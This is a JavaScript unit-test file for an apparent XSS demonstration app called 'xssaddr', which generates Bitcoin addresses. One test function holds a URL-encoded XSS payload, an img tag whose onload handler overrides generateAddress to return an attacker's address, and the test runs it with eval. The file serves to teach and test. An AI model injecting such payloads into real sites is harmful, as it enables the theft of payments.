/* This script contains unit tests for the xssaddr web application
*
* Author: Josh McIntyre
*/

// Functions for interacting with the document
function runTestsAndDisplayResults()
{
	var results = runTests();
	
	setTestResultsInDocument(results[0], results[1]);
}

// Functions for running tests

// This function will run the tests and parse results
function runTests()
{
	var results = [];

	var testNormalAddressRes = testNormalAddress();
	results.push(testNormalAddressRes);
	
	var testMaliciousAddressRes = testMaliciousAddress();
	results.push(testMaliciousAddressRes);

	var testsPassed = 0;
	var testsFailed = 0;
	for (var i = 0; i < results.length; i++)
	{
		if (results[i] == true)
		{
			testsPassed++;
		}
		else
		{
			testsFailed++;
		}
	}
	
	return [testsPassed, testsFailed];
}

// Test the normal address generation path
function testNormalAddress()
{
	var addressExpected = "1Nzo1mojzMSKpEdWMkusZJd4arcHU6ZeH7";
	var addressRes = generateAddress(1);
	
	var res = true;
	if (addressExpected != addressRes)
	{
		res = false;
	}
	
	return res;
}

// Test the XSS vulnerability path using the malicious userId payload
function testMaliciousAddress()
{
	/* A quick and dirty way to test the recommended sample malicious userId
	* In the real example, we set the userid HTML in the DOM to the malicious script,
	* which replaces the generateAddress function with the malicious one.
	* For this test, just parse out the malicious payload's replacement function,
	* and eval() it here in the test. There's no need to update the DOM for a unit test.
	*/
	var addressExpected = "1maliciousaddresskusZJd4arcHU6ZeH7";
	var maliciousPayload = "%3Cimg%20src%3D%22data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAA1JREFUGFdjYGRg%2FA8AAQoBAj0TXDIAAAAASUVORK5CYII%3D%22%20onload%3D%22generateAddress%20%3D%20function%28userId%29%7Breturn%20%271maliciousaddresskusZJd4arcHU6ZeH7%27%3B%7D%22%20%2F%3E";

	var userId = decodeURIComponent(maliciousPayload);
	var maliciousAddressFunction = userId.split("onload=\"")[1].slice(0,-4);
	eval(maliciousAddressFunction);


	// Generate an address after executing the malicious payload
	var addressRes = generateAddress(1);

	var res = true;
	if (addressExpected != addressRes)
	{
		res = false;
	}

	return res;
}

// A simple synchronous sleep function
function sleep(time)
{
	var start = Date.now();
	var now = start;
	while (now - start < time)
	{
		now = Date.now();
	}
}

// Set the userid value in the document
function setTestResultsInDocument(testsPassed, testsFailed)
{
	document.getElementById("testspassedlabel").innerHTML = "Tests passed:";
	document.getElementById("testspassed").innerHTML = testsPassed;
	
	document.getElementById("testsfailedlabel").innerHTML = "Tests failed:";
	document.getElementById("testsfailed").innerHTML = testsFailed;
	
	console.log("Tests passed: " + testsPassed);
	console.log("Tests failed: " + testsFailed);
}